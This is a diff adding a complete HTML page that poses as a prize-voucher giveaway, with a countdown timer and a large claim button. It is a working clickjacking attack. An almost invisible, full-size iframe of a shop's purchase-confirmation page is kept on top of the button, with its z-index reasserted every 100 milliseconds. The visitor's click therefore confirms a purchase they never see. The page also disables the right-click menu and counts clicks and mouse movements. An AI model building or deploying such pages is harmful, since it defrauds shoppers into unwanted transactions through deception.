@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Rewards Program - Claim Your Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 500px;
+            position: relative;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .prize-info {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .claim-button {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 20px 60px;
+            font-size: 24px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
+            transition: all 0.3s;
+            position: relative;
+            z-index: 1;
+        }
+
+        .claim-button:hover {
+            background: #218838;
+            transform: scale(1.05);
+        }
+
+        .terms {
+            font-size: 11px;
+            color: #666;
+            margin-top: 20px;
+        }
+
+        #attackFrame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 9999;
+            cursor: pointer;
+        }
+
+        .countdown {
+            font-size: 18px;
+            color: #d9534f;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <div class="prize-info">
+            <h2>You've Won a $500 Shopping Voucher!</h2>
+            <p>As a valued visitor, you've been randomly selected to receive an exclusive reward.</p>
+        </div>
+        <div class="countdown">
+            Offer expires in: <span id="timer">05:00</span>
+        </div>
+        <button class="claim-button" id="claimBtn">CLAIM YOUR PRIZE NOW!</button>
+        <p class="terms">By claiming this prize, you agree to our terms and conditions. No purchase necessary. Valid while supplies last.</p>
+        
+        <iframe id="attackFrame" src="https://shop.ecommerce.com/confirm-purchase"></iframe>
+    </div>
+
+    <script>
+        // Track user interactions
+        let clickAttempts = 0;
+        let mouseMovements = 0;
+
+        // Countdown timer
+        let timeLeft = 300;
+        const timerElement = document.getElementById('timer');
+        
+        setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }
+        }, 1000);
+
+        // Track mouse movements
+        document.addEventListener('mousemove', function() {
+            mouseMovements++;
+        });
+
+        // Adjust iframe properties dynamically
+        const iframe = document.getElementById('attackFrame');
+        
+        document.getElementById('claimBtn').addEventListener('mouseenter', function() {
+            // Ensure iframe is positioned correctly
+            iframe.style.opacity = '0.01';
+        });
+
+        // Track clicks
+        document.addEventListener('click', function(e) {
+            clickAttempts++;
+            
+            // Send tracking data
+            console.log('User interaction:', {
+                clicks: clickAttempts,
+                movements: mouseMovements,
+                timestamp: new Date().toISOString()
+            });
+        });
+
+        // Dynamic iframe adjustment
+        window.addEventListener('load', function() {
+            iframe.style.pointerEvents = 'auto';
+            
+            // Periodically ensure iframe stays on top
+            setInterval(() => {
+                iframe.style.zIndex = '9999';
+            }, 100);
+        });
+
+        // Detect if user tries to inspect
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Monitor iframe load
+        iframe.addEventListener('load', function() {
+            console.log('Target frame loaded successfully');
+        });
+    </script>
+</body>
+</html>
